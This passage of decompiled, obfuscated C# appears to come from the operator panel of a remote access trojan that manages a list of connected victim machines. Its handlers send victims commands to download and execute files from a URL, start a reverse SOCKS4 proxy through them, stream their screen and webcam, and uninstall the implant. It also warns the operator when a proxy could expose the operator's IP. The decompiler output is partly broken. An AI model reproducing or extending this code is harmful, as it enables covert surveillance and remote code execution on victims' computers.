						IEnumerator<KeyValuePair<string, CClient>> enumerator;
						if (enumerator != null)
						{
							enumerator.Dispose();
						}
					}
					Thread.Sleep(1000);
					if (concurrentStack.Count > 0)
					{
						this.method_21(ref concurrentStack);
					}
				}
			}
			catch (Exception ex3)
			{
			}
		}
	}

	// Token: 0x060013BB RID: 5051 RVA: 0x0009F2E4 File Offset: 0x0009D4E4
	private void method_88(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			try
			{
				this.method_10();
				if (this.vmethod_18().Items.Count > 0)
				{
					this.vmethod_10().Text = "Clients: " + Conversions.ToString(this.method_9()) + "/" + Conversions.ToString(this.struct7_0.method_0());
				}
				else
				{
					this.vmethod_10().Text = "Clients: 0/0";
				}
				ToolStripStatusLabel toolStripStatusLabel = this.vmethod_12();
				string text = "In/Out: ";
				double double_ = Class130.struct20_0.double_2;
				bool flag = false;
				ref bool ptr = ref flag;
				double num = double_;
				string text2 = text;
				ToolStripStatusLabel toolStripStatusLabel2 = toolStripStatusLabel;
				int num2;
				string text4;
				int num3;
				object obj;
				try
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string text3 = string.Empty;
					if (num >= 1099511627776.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num >= 1073741824.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num >= 1048576.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num >= 1024.0)
					{
						text3 = Strings.Format(num / 1024.0, "#0.00") + " KiB";
					}
					else if (num < 1024.0)
					{
						text3 = Conversions.ToString(Conversion.Fix(num)) + " B";
					}
					if (ptr)
					{
						text3 = Strings.Split(text3, " ", -1, CompareMethod.Text)[0];
					}
					if (text3.Length > 0)
					{
						text4 = text3;
					}
					else
					{
						text4 = " 0 B";
					}
					IL_1FE:
					goto IL_24E;
					IL_200:
					text4 = "0 B";
					goto IL_1FE;
					IL_209:
					num3 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
					IL_21F:;
				}
				catch when (endfilter(obj is Exception & num2 != 0 & num3 == 0))
				{
					Exception ex = (Exception)obj2;
					goto IL_209;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_24E:
				if (num3 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string text5 = text4;
				ToolStripStatusLabel toolStripStatusLabel3 = toolStripStatusLabel2;
				string text6 = text2;
				string text7 = text5;
				string text8 = "/";
				double double_2 = Class130.struct20_0.double_3;
				flag = false;
				ptr = ref flag;
				num = double_2;
				string str = text8;
				string str2 = text7;
				string str3 = text6;
				ToolStripStatusLabel toolStripStatusLabel4 = toolStripStatusLabel3;
				object obj3;
				try
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string text3 = string.Empty;
					if (num >= 1099511627776.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num >= 1073741824.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num >= 1048576.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num >= 1024.0)
					{
						text3 = Strings.Format(num / 1024.0, "#0.00") + " KiB";
					}
					else if (num < 1024.0)
					{
						text3 = Conversions.ToString(Conversion.Fix(num)) + " B";
					}
					if (ptr)
					{
						text3 = Strings.Split(text3, " ", -1, CompareMethod.Text)[0];
					}
					if (text3.Length > 0)
					{
						text4 = text3;
					}
					else
					{
						text4 = " 0 B";
					}
					IL_3FC:
					goto IL_44C;
					IL_3FE:
					text4 = "0 B";
					goto IL_3FC;
					IL_407:
					num3 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
					IL_41D:;
				}
				catch when (endfilter(obj3 is Exception & num2 != 0 & num3 == 0))
				{
					Exception ex2 = (Exception)obj4;
					goto IL_407;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_44C:
				if (num3 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string str4 = text4;
				toolStripStatusLabel4.Text = str3 + str2 + str + str4;
				ToolStripStatusLabel toolStripStatusLabel5 = this.vmethod_14();
				string[] array = new string[5];
				array[0] = "D: ";
				int num4 = 1;
				double num5 = Class130.struct20_0.double_2 - Class130.struct20_0.double_0;
				flag = false;
				ptr = ref flag;
				num = num5;
				int num6 = num4;
				string[] array2 = array;
				string[] array3 = array;
				ToolStripStatusLabel toolStripStatusLabel6 = toolStripStatusLabel5;
				object obj5;
				try
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string text3 = string.Empty;
					if (num >= 1099511627776.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num >= 1073741824.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num >= 1048576.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num >= 1024.0)
					{
						text3 = Strings.Format(num / 1024.0, "#0.00") + " KiB";
					}
					else if (num < 1024.0)
					{
						text3 = Conversions.ToString(Conversion.Fix(num)) + " B";
					}
					if (ptr)
					{
						text3 = Strings.Split(text3, " ", -1, CompareMethod.Text)[0];
					}
					if (text3.Length > 0)
					{
						text4 = text3;
					}
					else
					{
						text4 = " 0 B";
					}
					IL_624:
					goto IL_674;
					IL_626:
					text4 = "0 B";
					goto IL_624;
					IL_62F:
					num3 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
					IL_645:;
				}
				catch when (endfilter(obj5 is Exception & num2 != 0 & num3 == 0))
				{
					Exception ex3 = (Exception)obj6;
					goto IL_62F;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_674:
				if (num3 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string text9 = text4;
				ToolStripStatusLabel toolStripStatusLabel7 = toolStripStatusLabel6;
				string[] array4 = array3;
				array2[num6] = text9;
				array4[2] = "/s, U: ";
				int num7 = 3;
				double num8 = Class130.struct20_0.double_3 - Class130.struct20_0.double_1;
				flag = false;
				ptr = ref flag;
				num = num8;
				int num9 = num7;
				string[] array5 = array4;
				string[] array6 = array4;
				ToolStripStatusLabel toolStripStatusLabel8 = toolStripStatusLabel7;
				object obj7;
				try
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string text3 = string.Empty;
					if (num >= 1099511627776.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num >= 1073741824.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num >= 1048576.0)
					{
						text3 = Strings.Format(num / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num >= 1024.0)
					{
						text3 = Strings.Format(num / 1024.0, "#0.00") + " KiB";
					}
					else if (num < 1024.0)
					{
						text3 = Conversions.ToString(Conversion.Fix(num)) + " B";
					}
					if (ptr)
					{
						text3 = Strings.Split(text3, " ", -1, CompareMethod.Text)[0];
					}
					if (text3.Length > 0)
					{
						text4 = text3;
					}
					else
					{
						text4 = " 0 B";
					}
					IL_837:
					goto IL_887;
					IL_839:
					text4 = "0 B";
					goto IL_837;
					IL_842:
					num3 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
					IL_858:;
				}
				catch when (endfilter(obj7 is Exception & num2 != 0 & num3 == 0))
				{
					Exception ex4 = (Exception)obj8;
					goto IL_842;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_887:
				if (num3 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string text10 = text4;
				ToolStripItem toolStripItem = toolStripStatusLabel8;
				string[] array7 = array6;
				array5[num9] = text10;
				array7[4] = "/s";
				toolStripItem.Text = string.Concat(array7);
				if (this.vmethod_18().Items.Count > 0 & this.vmethod_18().ShowGroups)
				{
					try
					{
						foreach (OLVGroup olvgroup in this.vmethod_18().OLVGroups)
						{
							olvgroup.TitleImage = RuntimeHelpers.GetObjectValue(olvgroup.Key);
							OLVGroup olvgroup2 = olvgroup;
							bool showGroups = Class135.smethod_0().ShowGroups;
							object empty = string.Empty;
							string str5 = "Clients: ";
							OLVGroup olvgroup3;
							string key = Conversions.ToString((olvgroup3 = olvgroup).Key);
							long value = this.method_13(ref key);
							olvgroup3.Key = key;
							olvgroup2.Subtitle = Conversions.ToString(Interaction.IIf(showGroups, empty, str5 + Conversions.ToString(value)));
						}
					}
					finally
					{
						IEnumerator<OLVGroup> enumerator;
						if (enumerator != null)
						{
							enumerator.Dispose();
						}
					}
				}
				Class130.struct20_0.double_0 = Class130.struct20_0.double_2;
				Class130.struct20_0.double_1 = Class130.struct20_0.double_3;
			}
			catch (Exception ex5)
			{
			}
			Thread.Sleep(1000);
		}
	}

	// Token: 0x060013BC RID: 5052 RVA: 0x0009FD2C File Offset: 0x0009DF2C
	private void method_89(object sender, EventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:9*?<WO", object_);
	}

	// Token: 0x060013BD RID: 5053 RVA: 0x0009FD64 File Offset: 0x0009DF64
	private void method_90(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8R*?<3C", object_);
	}

	// Token: 0x060013BE RID: 5054 RVA: 0x0009FD9C File Offset: 0x0009DF9C
	private void method_91(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8]*?;s<", object_);
	}

	// Token: 0x060013BF RID: 5055 RVA: 0x0009FDD4 File Offset: 0x0009DFD4
	private void method_92(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9Z*?=Yl", object_);
	}

	// Token: 0x060013C0 RID: 5056 RVA: 0x0009FE0C File Offset: 0x0009E00C
	private void method_93(object sender, EventArgs e)
	{
		if (MessageBox.Show("Are you sure want to clear statistics?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			Class130.struct20_0.double_2 = 0.0;
			Class130.struct20_0.double_0 = 0.0;
			Class130.struct20_0.double_3 = 0.0;
			Class130.struct20_0.double_1 = 0.0;
			Class130.struct20_0.double_4 = 0.0;
			Class130.struct20_0.double_5 = 0.0;
		}
	}

	// Token: 0x060013C1 RID: 5057 RVA: 0x0009FEA0 File Offset: 0x0009E0A0
	private void method_94(object sender, EventArgs e)
	{
		if (Class135.smethod_0().NetworkBandwidth.Length == 0)
		{
			Interaction.MsgBox("No URL for a speed-test file has been set.\r\nPlease, check your settings!", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "speedtest|" + Class135.smethod_0().NetworkBandwidth;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013C2 RID: 5058 RVA: 0x0009FFC4 File Offset: 0x0009E1C4
	private void method_95()
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate120(this.method_95), new object[0]);
			return;
		}
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 1)
		{
			this.vmethod_116().Text = "Clients (" + Conversions.ToString(fastObjectListView.SelectedObjects.Count) + ")";
		}
		else
		{
			this.vmethod_116().Text = "Client";
		}
	}

	// Token: 0x060013C3 RID: 5059 RVA: 0x000A0050 File Offset: 0x0009E250
	private void method_96(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8C*?=5`", object_);
	}

	// Token: 0x060013C4 RID: 5060 RVA: 0x000A0088 File Offset: 0x0009E288
	private void method_97(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter URL to file", Application.ProductName, string.Empty, -1, -1);
		int num = (Operators.CompareString(text, string.Empty, true) == 0 | text.Length > 2048) ? 1 : 0;
		ref string ptr = ref text;
		int num2 = num;
		bool flag = false & Strings.LCase(ptr).StartsWith("https");
		if (ptr.ToLower().StartsWith("www."))
		{
			ptr = "http://" + ptr;
		}
		bool flag2 = Regex.IsMatch(ptr, "http(s)?://([\\w+?\\.\\w+])+([a-zA-Z0-9\\~\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)_\\-\\=\\+\\\\\\/\\?\\.\\:\\;\\'\\,]*)?");
		bool flag3 = flag2;
		if ((num2 | ((!flag3) ? 1 : 0)) != 0)
		{
			Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "dlexec|0|" + text;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013C5 RID: 5061 RVA: 0x000A0224 File Offset: 0x0009E424
	private void method_98(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter URL to file", Application.ProductName, string.Empty, -1, -1);
		int num = (Operators.CompareString(text, string.Empty, true) == 0 | text.Length > 2048) ? 1 : 0;
		ref string ptr = ref text;
		int num2 = num;
		bool flag = false & Strings.LCase(ptr).StartsWith("https");
		if (ptr.ToLower().StartsWith("www."))
		{
			ptr = "http://" + ptr;
		}
		bool flag2 = Regex.IsMatch(ptr, "http(s)?://([\\w+?\\.\\w+])+([a-zA-Z0-9\\~\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)_\\-\\=\\+\\\\\\/\\?\\.\\:\\;\\'\\,]*)?");
		bool flag3 = flag2;
		if ((num2 | ((!flag3) ? 1 : 0)) != 0)
		{
			Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "dlexec|1|" + text;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013C6 RID: 5062 RVA: 0x000A03C0 File Offset: 0x0009E5C0
	private void method_99(object sender, EventArgs e)
	{
		if (Class130.fSocks4R_0.cSocks4Server_0 == null)
		{
			Interaction.MsgBox("The reverse Socks4 manager is not active. Please, start it.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (Class130.struct18_2.method_0() & Class130.fSocks4R_0.cSocks4Server_0.PORT_MAIN > 0)
		{
			FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					if (cclient.IS_SSL || MessageBox.Show("WARNING: Client " + cclient.USER + " is connected to you via Tor.\r\nPerforming Reverse Proxy on this client may reveal your IP.\r\n\r\nDo you still wish to proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.No)
					{
						string sKey = cclient.sKey;
						string string_ = "socks4r_start|" + Conversions.ToString(Class130.fSocks4R_0.cSocks4Server_0.PORT_MAIN);
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return;
		}
		Interaction.MsgBox("The reverse Socks4 manager is not active. Please, start it.", MsgBoxStyle.Exclamation, Application.ProductName);
	}

	// Token: 0x060013C7 RID: 5063 RVA: 0x000A0544 File Offset: 0x0009E744
	public void method_100()
	{
		if (Class130.fSocks4R_0.vmethod_48().InvokeRequired)
		{
			Class130.fSocks4R_0.vmethod_48().Invoke(new fMain.Delegate138(this.method_100), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fSocks4R_0.Visible = true;
				Class130.fSocks4R_0.Activate();
				Form fSocks4R_ = Class130.fSocks4R_0;
				bool flag = false;
				Form form = fSocks4R_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fSocks4R_0.Opacity = 100.0;
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060013C8 RID: 5064 RVA: 0x0000AA87 File Offset: 0x00008C87
	private void method_101(object sender, EventArgs e)
	{
		this.method_100();
	}

	// Token: 0x060013C9 RID: 5065 RVA: 0x000A0648 File Offset: 0x0009E848
	private void method_102(object sender, EventArgs e)
	{
		if (Class130.fSocks4R_0.cSocks4Server_0 == null)
		{
			Interaction.MsgBox("The reverse Socks4 manager is not active. Please, start it.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
		try
		{
			foreach (object obj in fastObjectListView.SelectedObjects)
			{
				string sKey = ((CClient)obj).sKey;
				string string_ = "socks4r_stop|1";
				string string_2 = sKey;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x060013CA RID: 5066 RVA: 0x000A0744 File Offset: 0x0009E944
	private void method_103(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						CClient cclient2 = Class130.concurrentDictionary_3[cclient.sKey];
						try
						{
							if (cclient2.fPr == null)
							{
								cclient2.fPr = new fPreview();
								cclient2.fPr.method_3(cclient2.sIP, cclient2.sPort, cclient2.sLANIP, cclient2.sUser, cclient2.sKey);
								cclient2.fPr.Opacity = 0.0;
								cclient2.fPr.Show();
							}
							else if (!cclient2.fPr.Visible)
							{
								cclient2.fPr.method_7();
							}
							cclient2.fPr.method_16();
							string sKey = cclient2.sKey;
							string string_ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
							{
								"screen_preview_start|",
								cclient2.sKey,
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewQuality),
								"|"
							}), Interaction.IIf(cclient2.fPr.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)), "|"), cclient2.fPr.Width), "|"), cclient2.fPr.Height));
							string string_2 = sKey;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex)
							{
							}
							cclient2.PREVIEW_SCREEN_IS_ENABLED = true;
						}
						catch (Exception ex2)
						{
						}
						this.vmethod_90().Enabled = false;
					}
					catch (Exception ex3)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013CB RID: 5067 RVA: 0x000A0A10 File Offset: 0x0009EC10
	private void method_104(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						CClient cclient2 = Class130.concurrentDictionary_3[cclient.sKey];
						try
						{
							if (cclient2.fPr == null)
							{
								cclient2.fPr = new fPreview();
								cclient2.fPr.method_3(cclient2.sIP, cclient2.sPort, cclient2.sLANIP, cclient2.sUser, cclient2.sKey);
								cclient2.fPr.Opacity = 0.0;
								cclient2.fPr.Show();
							}
							else if (!cclient2.fPr.Visible)
							{
								cclient2.fPr.method_7();
							}
							cclient2.fPr.method_16();
							string sKey = cclient2.sKey;
							string string_ = string.Concat(new string[]
							{
								"webcam_preview_start|",
								cclient2.sKey,
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewQuality)
							});
							string string_2 = sKey;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex)
							{
							}
							cclient2.PREVIEW_WEBCAM_IS_ENABLED = true;
						}
						catch (Exception ex2)
						{
						}
						this.vmethod_90().Enabled = false;
					}
					catch (Exception ex3)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013CC RID: 5068 RVA: 0x000A0C5C File Offset: 0x0009EE5C
	private void method_105(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O5F*?5/&", object_);
	}

	// Token: 0x060013CD RID: 5069 RVA: 0x000A0C94 File Offset: 0x0009EE94
	private void method_106(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Uninstall selected clients?", "Disconnect the selected client?")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_un|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
						this.concurrentStack_1.Push(cclient);
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013CE RID: 5070 RVA: 0x000A0DF8 File Offset: 0x0009EFF8
	private void method_107(object sender, FormatRowEventArgs e)
	{
		try
		{
			CClient cclient = (CClient)e.Model;
			if (cclient.bJustConnected)
			{
				e.Item.BackColor = Color.LimeGreen;
			}
			else if (!cclient.pending_dc & !cclient.pending_dc_timeout)
			{
				if (!Class135.smethod_0().UIThumbnails)
				{
					cclient.ICO_STATUS = Class130.imageList_0.Images["online"];
				}
				e.Item.BackColor = Color.White;
			}
			else if (cclient.pending_dc & cclient.pending_dc_timeout)
			{
				if (!Class135.smethod_0().UIThumbnails)
				{
					cclient.ICO_STATUS = Class130.imageList_0.Images["offline"];
				}
				e.Item.BackColor = Color.Yellow;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (cclient.pending_dc & !cclient.pending_dc_timeout)
			{
				if (!Class135.smethod_0().UIThumbnails)
				{
					cclient.ICO_STATUS = Class130.imageList_0.Images["offline"];
				}
				e.Item.BackColor = Color.Red;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060013CF RID: 5071 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_108(object sender, EventArgs e)
	{
	}

	// Token: 0x060013D0 RID: 5072 RVA: 0x000A0F84 File Offset: 0x0009F184
	private void method_109(object sender, EventArgs e)
	{
		if (!Class130.struct18_5.method_0() & !Class130.struct18_6.method_0())
		{
			int num = (Class130.struct7_3.method_0() > 0L) ? 1 : 0;
			Class136.Struct27 @struct = default(Class136.Struct27);
			@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
			bool flag = false;
			if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
			{
				flag = true;
			}
			long num2;
			if (flag)
			{
				num2 = Class136.GetTickCount64();
			}
			else
			{
				num2 = (long)Class136.GetTickCount();
			}
			long num3 = num2;
			if ((num & ((checked(num3 - Class130.struct7_3.method_0()) > 420000L) ? 1 : 0)) != 0)
			{
				BackgroundWorker backgroundWorker = new BackgroundWorker();
				backgroundWorker.WorkerSupportsCancellation = true;
				backgroundWorker.DoWork += this.method_90;
				backgroundWorker.RunWorkerAsync();
			}
		}
	}

	// Token: 0x060013D1 RID: 5073 RVA: 0x0000AA51 File Offset: 0x00008C51
	private void method_110(object sender, EventArgs e)
	{
		this.method_69();
	}

	// Token: 0x060013D2 RID: 5074 RVA: 0x000A1050 File Offset: 0x0009F250
	private void method_111(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O6P*?6CI", object_);
	}

	// Token: 0x060013D3 RID: 5075 RVA: 0x000A1088 File Offset: 0x0009F288
	private void method_112()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9:*?9bS", object_);
	}

	// Token: 0x060013D4 RID: 5076 RVA: 0x000A10B8 File Offset: 0x0009F2B8
	private void method_113(object sender, EventArgs e)
	{
		Class145.smethod_3().method_2().Visible = true;
		Form form = Class145.smethod_3().method_2();
		bool flag = false;
		Form form2 = form;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form2.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form2.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form2.Height) / 2;
			form2.Location = new Point(x, y);
			if (flag)
			{
				form2.Visible = true;
			}
			Class145.smethod_3().method_2().Opacity = 100.0;
		}
	}

	// Token: 0x060013D5 RID: 5077 RVA: 0x000A116C File Offset: 0x0009F36C
	public void method_114()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8%*?;I.", object_);
	}

	// Token: 0x060013D6 RID: 5078 RVA: 0x000A119C File Offset: 0x0009F39C
	private void method_115(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
